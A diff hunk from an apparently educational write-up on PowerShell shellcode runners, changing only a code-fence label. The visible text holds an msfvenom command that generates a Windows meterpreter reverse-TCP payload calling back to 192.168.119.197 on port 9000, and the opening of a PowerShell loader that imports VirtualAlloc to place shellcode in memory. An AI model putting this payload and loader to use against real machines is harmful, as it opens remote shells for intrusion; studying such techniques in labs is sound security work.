@@ -40,7 +40,8 @@ The next portion of the script (beginning at line 14), is where the memory for o
 To start, we need to generate a meterpreter shell using MSFVenom:
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.197 LPORT=9000 -f powershell`
 We can then feed this into our initial script, setting the $sc variable to our generate payload. The final payload should look like the following:
-```$code = '
+```powershell
+$code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
